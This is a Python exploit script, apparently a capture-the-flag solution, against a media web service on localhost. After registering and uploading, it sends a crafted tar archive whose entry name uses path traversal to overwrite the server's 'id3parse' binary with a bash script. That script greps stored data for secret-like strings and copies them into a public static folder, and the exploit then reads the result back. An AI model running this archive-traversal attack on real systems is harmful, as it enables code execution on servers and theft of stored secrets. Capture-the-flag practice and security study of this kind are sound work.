import requests

import tarfile
import io
import base64


attack_target = "attack data"


def attack():
    burp0_url = "http://localhost:8080/api/media/register"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    burp0_json = {"p": "12asdsadsad3", "u": "mmeasdsadas"}
    requests.post(
        burp0_url,
        headers=burp0_headers,
        cookies=burp0_cookies,
        json=burp0_json,
    )

    burp0_url = "http://localhost:8080/api/media/upload"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    burp0_json = {
        "mp3_b64": "somebase64",
        "p": "12asdsadsad3",
        "u": "mmeasdsadas",
    }

    r = requests.post(
        burp0_url,
        headers=burp0_headers,
        cookies=burp0_cookies,
        json=burp0_json,
    )

    my_filename = r.json().get("track_id")

    def set_perm(tarinfo):
        tarinfo.mode = 0o777
        return tarinfo

    filename = io.BytesIO()
    text = b"""#!/bin/bash\n\ngrep -E "[A-Z0-9]{31}=" -r /app/stores 2>&1 >/app/static/foo.txt\n"""
    file_data = io.BytesIO(
        b"""#!/bin/bash\n\ngrep -E "[A-Z0-9]{31}=" -r /app/stores 2>&1 >/app/static/foo.txt\n"""
    )
    with tarfile.open(fileobj=filename, mode="w|") as tar:
        file = tarfile.TarInfo(name="../../../../../../app/native/id3parse")
        file.mode = 0o777
        file.size = len(text)
        file.mtime = int(21132131)
        tar.addfile(
            file,
            fileobj=file_data,
        )
    filename.seek(0)
    tarcontent = base64.b64encode(filename.read())
    print(tarcontent, "content")

    burp0_url = "http://localhost:8080/api/media/pack"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Target-User": "6c8WhJLub3Jgfn3VUjjbNzXC",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    burp0_json = {"tar_b64": tarcontent.decode()}
    requests.post(
        burp0_url,
        headers=burp0_headers,
        cookies=burp0_cookies,
        json=burp0_json,
    )

    burp0_url = f"http://localhost:8080/api/media/flag/{my_filename}?u=mmeasdsadas&p=12asdsadsad3"
    burp0_cookies = {"csrftoken": "2iFUYGWRybgGAbHpUskB5dXYoUHrS4L4"}
    burp0_headers = {
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Target-User": "6c8WhJLub3Jgfn3VUjjbNzXC",
        "Referer": "http://localhost:8080/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(r.text)


attack()
